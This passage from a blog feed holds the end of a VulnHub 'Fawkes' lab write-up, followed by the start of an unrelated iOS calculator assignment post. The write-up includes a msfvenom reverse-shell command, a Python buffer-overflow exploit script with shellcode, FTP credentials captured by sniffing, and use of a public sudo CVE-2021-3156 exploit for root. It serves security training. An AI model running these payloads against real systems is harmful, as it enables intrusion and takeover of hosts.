src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102145117162.png" alt="image-20221102145117162"  width=600 /> </body><p>发现第113、114、115、116个字符（“BBBB”）恰好进入 EIP，而其后的字符保留在栈中。</p><p>设想将反弹 shell 代码注入栈中，而使程序跳转到栈中执行（<code>jmp esp</code>），即可令靶机上的程序执行反弹 shell 代码生成反弹 shell。</p></li><li><p>寻找原程序中的 <code>jmp esp</code> 指令，打开 <code>edb</code> 的 <code>Opcode Search</code>：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102150253164.png" alt="image-20221102150253164"  width=750 /> </body><p>选择一个可执行段，然后选择搜索 <code>ESP -&gt; EIP</code>：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102150439846.png" alt="image-20221102150439846"  width=650 /> </body><p>找到 <code>jmp esp</code> 指令并记录其地址（<code>0x08049d55</code>）：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102150528530.png" alt="image-20221102150528530"  width=650 /> </body></li><li><p>构造注入字符串：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -b <span class="string">&quot;\x00&quot;</span> -f py</span></span><br></pre></td></tr></table></figure><ul><li><code>LHOST</code>：改为 kali 的 IP；</li><li><code>LPORT</code>：改为监听反弹 shell 的端口号；</li><li><code>-b &quot;\x00&quot;</code>：过滤坏字符（’\0’），避免输入提前终止。</li></ul><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102151042228.png" alt="image-20221102151042228"  width=750 /> </body></li><li><p>编写注入脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct, socket</span><br><span class="line"></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\xec\xbe\xe7\x1d\x4c\x47\xd9\x74\x24\xf4\x5f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x29\xc9\xb1\x12\x31\x77\x17\x03\x77\x17\x83\x08&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xe1\xae\xb2\xe7\xc1\xd8\xde\x54\xb5\x75\x4b\x58&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xb0\x9b\x3b\x3a\x0f\xdb\xaf\x9b\x3f\xe3\x02\x9b&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x09\x65\x64\xf3\x83\x95\x94\x0c\xfc\x97\x98\x03&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa0\x1e\x79\x93\x3e\x71\x2b\x80\x0d\x72\x42\xc7&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xbf\xf5\x06\x6f\x2e\xd9\xd5\x07\xc6\x0a\x35\xb5&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x7f\xdc\xaa\x6b\xd3\x57\xcd\x3b\xd8\xaa\x8e&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">112</span> * <span class="string">b&#x27;A&#x27;</span> + struct.pack(<span class="string">&#x27;I&#x27;</span>,<span class="number">0x08049d55</span>) + <span class="number">32</span> * <span class="string">b&#x27;\x90&#x27;</span> + buf</span><br><span class="line"></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&#x27;10.0.2.11&#x27;</span>,<span class="number">9898</span>))</span><br><span class="line">s.send((payload))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>关于上述脚本，我们在栈溢出跳转地址和攻击代码之间加入了一长串空指令 <code>nop</code>（<code>\x90</code>）。<strong>至于为什么一定要加上这一段，我们先看看运行注入代码时发生了什么。</strong></p><blockquote><p>在本地调试时，上述脚本中 connect 的 IP 参数要更改为 127.0.0.1</p></blockquote><p>程序成功跳转到 <code>jmp esp</code> 指令时，观察栈中数据，发现从 <code>08049d55</code> （我们注入的 <code>jmp esp</code> 指令地址）之后紧接着就是我们加入的32个 <code> \x90</code>。</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102160339385.png" alt="image-20221102160339385"  width=750 /> </body><p>接着往下看，当程序运行到 <code>fnstenv [esp - 0xc]</code> 指令时，栈中数据发生了变化，部分空指令被新数据覆盖：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102160608834.png" alt="image-20221102160608834"  width=750 /> </body><p>注入代码中存在指令修改了栈顶数据，若不加空指令，我们的注入代码本身就处于栈顶，则会在执行过程中将自身的代码覆盖掉。添加空指令之后，EIP 会沿着空指令一直增长到真正的注入代码，而 ESP 不变，使 EIP 与 ESP 拉开一定的距离，一定程度上保证注入在栈中的代码不会被修改。</p><p>故<strong>在注入时加入一段空指令可以提高程序稳定性，一般加入的空指令数为4的倍数</strong>。</p></li><li><p>监听 4444 端口，执行上述脚本，获取反弹 shell：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102163819732.png" alt="image-20221102163819732"  width=650 /> </body></li></ol><h3 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03. 信息收集"></a>0x03. 信息收集</h3><ol><li><p>发现当前用户的主目录下存在隐藏文件：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102164827048.png" alt="image-20221102164827048"  width=700 /> </body><p>查看该文件内容： </p><p><code>HarrYp0tter@Hogwarts123</code></p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102165848456.png" alt="image-20221102165848456"  width=550 /></body><p>疑似某个密码，联想此前靶机上开放的 ssh 端口，尝试通过 ssh 登录靶机。</p></li><li><p>首先通过22端口登录，发现登录失败；转而通过2222端口登录，发现登录成功：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102170759008.png" alt="image-20221102170759008"  width=700 />  </body></li><li><p>查看用户权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo -l</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102170906423.png" alt="image-20221102170906423"  width=650 /> </body><p>发现当前用户可以不使用密码通过 <code>sudo</code> 执行所有命令。</p></li><li><p>使用 <code>sudo -i</code> 指令直接提权，并发现 root 账号主目录下存在两个文件：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102171235709.png" alt="image-20221102171235709"  width=500 /> </body></li><li><p>查看当前环境 IP：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102171442911.png" alt="image-20221102171442911"  width=800 /> </body><p>根据 <code>lab2</code> 的经验，我们进入的可能是一个 <code>docker</code> 容器而非靶机本身。</p></li><li><p>查看此前发现的两个文件：</p><ul><li><p><strong>horcrux1.txt：</strong>horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;}</p></li><li><p><strong>note.txt：</strong></p><p>Hello Admin!!</p><p>We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</p></li></ul><p>第一个文件为我们发现的第一个 Flag，第二个文件为一些提示，提示我们需要监听靶机 FTP 服务的流量，即靶机21端口的流量。</p></li></ol><h3 id="0x04-tcpdump-流量分析"><a href="#0x04-tcpdump-流量分析" class="headerlink" title="0x04. tcpdump 流量分析"></a>0x04. tcpdump 流量分析</h3><ol><li><p>使用 <code>tcpdump</code> 命令监听靶机21端口：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tcpdump -i eth0 port 21</span></span><br></pre></td></tr></table></figure><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102172625767.png" alt="image-20221102172625767"  width=800 /> </body></li><li><p>等待片刻后发现输出了一些流量记录：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102173440633.png" alt="image-20221102173440633"  width=750 /> </body><p>发现其握手信息中包含用户名和密码。</p><ul><li>USER：<code>neville</code></li><li>PASS：<code>bL!Bsg3k</code></li></ul></li><li><p>尝试使用上述用户名和密码通过靶机的22端口登入靶机：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102173809386.png" alt="image-20221102173809386"  width=850 /> </body><p>成功登录后，通过 IP 信息发现此时环境为真正的靶机。</p></li><li><p>查看当前路径下的文件，获取第二个 Flag：</p><ul><li><strong>horcrux2.txt：</strong>horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}</li></ul><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102174006923.png" alt="image-20221102174006923"  width=10000 /> </body></li></ol><h3 id="0x05-sudo-漏洞提权"><a href="#0x05-sudo-漏洞提权" class="headerlink" title="0x05. sudo 漏洞提权"></a>0x05. sudo 漏洞提权</h3><ol><li><p>查看内核与 sudo 版本信息：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102174336959.png" alt="image-20221102174336959" width=650 /> </body></li><li><p>上网搜索相关的漏洞信息，最终发现针对当前版本 sudo 的一个漏洞及其利用代码：</p><p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit"><code>CVE-2021-3156</code>: Heap-Based Buffer Overflow in Sudo (Baron Samedit)</a></p><p>利用代码：<a href="https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py">https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py</a></p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102182310949.png" alt="image-20221102182310949" width=850 /> </body><p>将此处 sudo 的路径更改为靶机上 sudo 的路径：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102182406991.png" alt="image-20221102182406991" width=650 /> </body></li><li><p>在 kali 上开启 web 应用，将该文件上传至靶机运行：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102182723675.png" alt="image-20221102182723675" width=550 /> </body><p>成功提权！</p></li><li><p>前往靶机的 <code>/root/</code> 路径，发现第三个 Flag：</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102182855456.png" alt="image-20221102182855456" width=700 />  </body></li></ol><h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ul><li><p><strong>Flag1：</strong>horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;}</p></li><li><p><strong>Flag2：</strong>horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t}</p></li><li><p><strong>Flag3：</strong></p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102182855456.png" alt="image-20221102182855456" width=550 /> </body></li><li><p><strong>root 权限：</strong></p><body style="text-align:left"><img src="https://blog.kekwy.com/media/vulnhub-Fawkes/image-20221102182723675.png" alt="image-20221102182723675" width=650 /> </body></li></ul><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul><li>从端口服务信息中得知靶机 FTP 服务允许匿名登录，尝试匿名登录，通过 get 指令下载文件<code>server_hogwarts</code>，发现是一个可执行文件；</li><li>试运行该程序，推测该程序与靶机 9898 端口所运行服务的程序相同；</li><li>使用 <code>edb</code> 对该程序进行调试，发现栈溢出攻击注入点，并编写注入脚本，向靶机 9898 端口服务注入反弹 shell 代码；</li><li>成功获取反弹 shell，在当前用户主目录的隐藏文件中发现可用于 ssh 登录的密码；</li><li>使用 ssh 通过靶机 2222端口登录后，发现位于一个容器中，且当前用户可以直接使用 <code>sudo -i</code> 进行提权。在当前容器 root 用户的主目录中发现第一个 Flag；</li><li>使用 <code>tcpdump</code> 监听容器 21 端口的流量，发现 FTP 的握手过程包含了用户名和密码，猜测可以用来通过 ssh 登入靶机。尝试后成功通过22端口进入靶机；</li><li>在靶机当前用户的主目录下发现第二个 Flag；</li><li>查看发行版本以及 <code>sudo</code> 版本，上网查找相关漏洞，最终找到可用的漏洞利用代码。简单修改后，从 kali 上传靶机，在靶机执行后成功获取 root 权限。</li><li>在靶机 root 用户的主目录下，发现最后一个 Flag。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;网络攻防实战 第七次实验&lt;/p&gt;
&lt;p&gt;邮箱：&lt;a href=&quot;mailto:&amp;#107;&amp;#x65;&amp;#101;&amp;#107;&amp;#x6b;&amp;#x65;&amp;#119;&amp;#x79;&amp;#64;&amp;#113;&amp;#113;&amp;#46;&amp;#99;&amp;#111;&amp;#10</summary>
      
    
    
    
    <category term="网络攻防实战" scheme="http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="学习" scheme="http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="Kali" scheme="http://blog.kekwy.com/tags/Kali/"/>
    
    <category term="网络" scheme="http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"/>
    
    <category term="安全" scheme="http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.kekwy.com/tags/Linux/"/>
    
    <category term="vulnhub" scheme="http://blog.kekwy.com/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>【iOS开发】iw01 科学计算器</title>
    <link href="http://blog.kekwy.com/iw1-calculator/"/>
    <id>http://blog.kekwy.com/iw1-calculator/</id>
    <published>2022-10-19T08:01:44.000Z</published>
    <updated>2022-11-10T11:21:33.769Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>iOS assignment 1: Calculator App.</p><p>姓名：可弟WZ Kekwy</p><p>邮箱：<a href="mailto:&#x6b;&#101;&#x65;&#x6b;&#107;&#101;&#x77;&#x79;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#x6b;&#101;&#x65;&#x6b;&#107;&#101;&#x77;&#x79;&#x40;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a></p></blockquote><p>用 swift &amp; storyboard 实现一个计算器APP（包括科学计算器）。</p><p><strong>项目仓库：</strong><a href="https://github.com/Kekwy/iwork1-Calculator">https://github.com/Kekwy/iwork1-Calculator</a></p><h2 id="一、界面设计"><a href="#一、界面设计" class="headerlink" title="一、界面设计"></a>一、界面设计</h2><blockquote><p>静态布局</p></blockquote><h3 id="0x0-StackView"><a href="#0x0-StackView" class="headerlink" title="0x0. StackView"></a>0x0. StackView</h3><p>大体分为上下两部分，上方为计算器的显示区域，下方为按键区域。</p><body style="text-align:left"><p><img src="https://blog.kekwy.com/media/iw1/image-20221021214843621.png" width=300 /><img src="https://assets.kekwy.com/images/image-20221021215053626.png" width=175 /></p></body><h4 id="0x00-主要约束"><a href="#0x00-主要约束" class="headerlink" title="0x00. 主要约束"></a>0x00. 主要约束</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Stack View.top = Safe Area.top</span><br><span class="line">Stack View.leading = Safe Area.leading</span><br><span class="line">Safe Area.bottom = Stack View.bottom</span><br><span class="line">Safe Area.trailing = Stack View.trailing</span><br></pre></td></tr></table></figure><p>使当前控件大小与父控件大小一致，即填充满父控件。</p><h4 id="0x01-显示区域（View1）"><a href="#0x01-显示区域（View1）" class="headerlink" title="0x01. 显示区域（View1）"></a>0x01. 显示区域（View1）</h4><p><img src="https://assets.kekwy.com/images/image-20221021220541500.png" width=225 /><img src="https://assets.kekwy.com/images/image-20221022103357516.png" width=175 /></p><ul><li><p>View：为该区域提供指定的背景色。</p></li><li><p>Stack View：管理两个主要的UILabel。</p><ul><li><p>Exp Label：显示表达式；</p></li><li><p>Res Label：显示表达式的运算结果；</p></li><li><p>主要约束：纵向填充，左右边缘与 View 始终存在10的间隔。</p><body style="text-align:left"><p><img src="https://blog.kekwy.com/media/iw1/image-20221022104342889.png" width=225 /><img src="https://blog.kekwy.com/media/iw1/image-20221022103847478.png" width=250 /></p></body></li></ul></li></ul><h4 id="0x02-按键区域（View2）"><a href="#0x02-按键区域（View2）" class="headerlink" title="0x02. 按键区域（View2）"></a>0x02. 按键区域（View2）</h4><body style="text-align:left"><p><img src="https://blog.kekwy.com/media/iw1/image-20221022105450619.png" width=300 /><img src="https://blog.kekwy.com/media/iw1/image-20221022110946864.png" width=225 /></p></body><ul><li><p>VIew：为按键区域提供指定的背景色。</p></li><li><p>Stack View：管理附加按键区与常规按键区。</p></li><li><p>主要约束：将按键区的高设置为屏幕高的70%：<code>View.height = 0.7 × height</code></p></li></ul><h5 id="0x020-常规按键区"><a href="#0x020-常规按键区" class="headerlink" title="0x020. 常规按键区"></a>0x020. 常规按键区</h5><body style="text-align:left"><p><img src="https://blog.kekwy.com/media/iw1/image-20221022125626690.png" width=225 /><img src="https://blog.kekwy.com/media/iw1/image-20221022111946572.png" width=225 /></p></body><ul><li><p><strong>前四行按钮：</strong></p><ol><li>填充策略为 <code>Fill Equally</code>；</li><li>每行四个按钮由一个 <code>Stack View</code> 管理，填充策略同样为 <code>Fill Equally</code>；</li><li>通过约束将其高度设置为整个按键区高度的66%。</li></ol><body style="text-align:left"><p> <img src="https://blog.kekwy.com/media/iw1/image-20221022130536389.png" width=225 /> <img src="https://blog.kekwy.com/media/iw1/image-20221022130320506.png" width=175 /> </p></body></li><li><p><strong>后两行按钮</strong>：</p><p>包含两个 <code>Stack View</code>。位于左侧的 <code>Stack View</code> 管理左侧六个按钮，排成两行，其中每行三个按钮又由一个 <code>Stack View</code> 管理；位于右侧的 <code>Stack View</code> 中只有作为等于操作键的一个按钮，可使其高度约为其他按钮的两倍。</p><body style="text-align:left"><img src="https://blog.kekwy.com/media/iw1/image-20221022130925213.png" width=225 /><img src="https://blog.kekwy.com/media/iw1/image-20221022131554415.png" width=175 /></body><p>通过设置约束，将左侧 <code>Stack View</code> 的宽约束为整个常规按键区宽度的75%。</p></li></ul><h5 id="0x021-附加按键区"><a href="#0x021-附加按键区" class="headerlink" title="0x021. 附加按键区"></a>0x021. 附加按键区</h5><blockquote><p>在切换为科学计算器（设备横屏）时自动显示</p></blockquote><body style="text-align:left"><img src="https://blog.kekwy.com/media/iw1/image-20221022135217250.png" width=550 /></body><ul><li>与常规按键区类似，每行三个按钮由一个 <code>Stack View</code> 管理，该部分所有 <code>Stack View</code> 的填充方式均为 <code>Fill Equally</code>。</li><li>设置约束，将管理整个附加按键区的 <code>Stack View</code> 的宽设置为整个按键区宽的3&#x2F;7。</li></ul><h5 id="0x022-按钮细节"><a href="#0x022-按钮细节" class="headerlink" title="0x022. 按钮细节"></a>0x022. 按钮细节</h5><p>通过设置按钮属性 <code>layer.cornerRadius</code> 设置按钮圆角的弧度。竖屏状态设置为20，横屏状态设置为40.</p><h3 id="0x1-D-x2F-R-Show-Label"><a href="#0x1-D-x2F-R-Show-Label" class="headerlink" title="0x1. D&#x2F;R Show Label"></a>0x1. D&#x2F;R Show Label</h3><body style="text-align:left"><img src="https://blog.kekwy.com/media/iw1/image-20221022140840244.png" width=550 /></body><p>用于显示当前的计算模式是弧度制（Rad）还是角度制（Deg）。横屏模式下显示于显示区域的左上角（通过约束实现），竖屏模式自动隐藏，可通过相关功能按键进行切换。</p><h2 id="二、功能实现"><a href="#二、功能实现" class="headerlink" title="二、功能实现"></a>二、功能实现</h2><h3 id="0x0-基础功能"><a href="#0x0-基础功能" class="headerlink" title="0x0. 基础功能"></a>0x0. 基础功能</h3><h4 id="0x00-用户输入处理"><a href="#0x00-用户输入处理" class="headerlink" title="0x00. 用户输入处理"></a>0x00. 用户输入处理</h4><p>用户每次点击按钮时，计算器会执行其运行逻辑。对于非功能按钮，用户输入会在 ViewController 中被追加在当前表达式之后，然后整个表达式会被传入 Calculator 进行解析。</p><p>若用户点击功能性按钮，将在 ViewController 中调用相应的函数进行处理。</p><h4 id="0x01-主要运算逻辑"><a href="#0x01-主要运算逻辑" class="headerlink" title="0x01. 主要运算逻辑"></a>0x01. 主要运算逻辑</h4><blockquote><p>良好的支持多优先级操作符</p></blockquote><p>使用中缀表达式转后缀表达式的计算思路，参考《数据结构》。为每个操作符设置栈中优先级和栈外优先级，天然的支持多优先级运算，即良好的支持了科学计算器中出现的多个复杂操作符。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> isp <span class="operator">=</span> [<span class="string">&quot;#&quot;</span>: <span class="number">0</span>,</span><br><span class="line">               <span class="string">&quot;(&quot;</span>: <span class="number">1</span>,</span><br><span class="line">               <span class="string">&quot;×&quot;</span>: <span class="number">5</span>,</span><br><span class="line">               <span class="string">&quot;÷&quot;</span>: <span class="number">5</span>,</span><br><span class="line">               <span class="operator">...</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> icp <span class="operator">=</span> [<span class="string">&quot;#&quot;</span>: <span class="number">0</span>,</span><br><span class="line">               <span class="string">&quot;(&quot;</span>: <span class="number">10</span>,</span><br><span class="line">               <span class="string">&quot;×&quot;</span>: <span class="number">4</span>,</span><br><span class="line">               <span class="string">&quot;÷&quot;</span>: <span class="number">4</span>,</span><br><span class="line">               <span class="operator">...</span></span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>同时设置两个栈结构，一个用于保存操作数，另一个用于保存操作符，当有操作符退栈时，根据其运算规则从操作数栈中退出若干操作数，进行运算后将结果压入操作数栈。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">func</span> <span class="title function_">calSubExp</span>(<span class="params">opt</span>: <span class="type">String</span>) -&gt; <span class="type">Bool</span>&#123;</span><br><span class="line">        <span class="operator">...</span></span><br><span class="line">        <span class="keyword">switch</span> opt &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;×&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> numStack.count <span class="operator">&lt;</span> <span class="number">2</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> num1 <span class="operator">=</span> numStack.popLast()<span class="operator">!</span></span><br><span class="line">            <span class="keyword">let</span> num2 <span class="operator">=</span> numStack.popLast()<span class="operator">!</span></span><br><span class="line">            numStack.append(num1 <span class="operator">*</span> num2)</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;÷&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> numStack.count <span class="operator">&lt;</span> <span class="number">2</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> num1 <span class="operator">=</span> numStack.popLast()<span class="operator">!</span></span><br><span class="line">            <span class="keyword">let</span> num2 <span class="operator">=</span> numStack.popLast()<span class="operator">!</span></span><br><span class="line">            numStack.append(num2 <span class="operator">/</span> num1)</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;%&quot;</span>:</span><br><span class="line">            <span class="operator">...</span></span><br></pre></td></tr></table></figure><h4 id="0x02-memery-操作"><a href="#0x02-memery-操作" class="headerlink" title="0x02. memery 操作"></a>0x02. memery 操作</h4><p>主要处理 memery 中出错和 memery 为空的情况：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">func</span> <span class="title function_">memeryRead</span>() -&gt; <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> empty &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> isError &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">String</span>(memery)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">func</span> <span class="title function_">memeryClear</span>() &#123;</span><br><span class="line">    memery <span class="operator">=</span> <span class="number">0.0</span></span><br><span class="line">    empty <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">    isError <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-角度制与弧度制的切换"><a href="#0x03-角度制与弧度制的切换" class="headerlink" title="0x03. 角度制与弧度制的切换"></a>0x03. 角度制与弧度制的切换</h4><p>计算三角函数时，根据当前计算器的模式对操作数进行转换（浮点数精度可能导致误差）：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="operator">!</span>isRad &#123; <span class="comment">// 表示处于角度制模式</span></span><br><span class="line">  tmp <span class="operator">=</span> <span class="number">360</span> <span class="operator">*</span> tmp <span class="operator">/</span> (<span class="number">2</span> <span class="operator">*</span> acos(<span class="operator">-</span><span class="number">1.0</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x04-按钮功能切换（函数与反函数之间的互换）"><a href="#0x04-按钮功能切换（函数与反函数之间的互换）" class="headerlink" title="0x04. 按钮功能切换（函数与反函数之间的互换）"></a>0x04. 按钮功能切换（函数与反函数之间的互换）</h4><p>当使用者点击 <code>inv</code> 按钮时，会更改部分按钮的 title。被更改 title 的按钮被点击时，在根据新的 title 在 <code>buttonTouched</code> 中执行对应的分支。再次点击 <code>inv</code> 会复原这些按钮之前的 title，即实现按钮功能的切换。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">func</span> <span class="title function_">doInv</span>() &#123;</span><br><span class="line">    <span class="keyword">if</span> isInv &#123;</span><br><span class="line">        lnButton.setTitle(<span class="string">&quot;ln&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        logButton.setTitle(<span class="string">&quot;log&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        sinButton.setTitle(<span class="string">&quot;sin&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        cosButton.setTitle(<span class="string">&quot;cos&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        tanButton.setTitle(<span class="string">&quot;tan&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        isInv <span class="operator">=</span> <span class="literal">false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lnButton.setTitle(<span class="string">&quot;eˣ&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">        logButton.setTitle(<span class="string">&quot;10ˣ&quot;</span>, for: <span class="type">UIControl</span>.<span class="type">State</span>.normal)</span><br><span class="line">   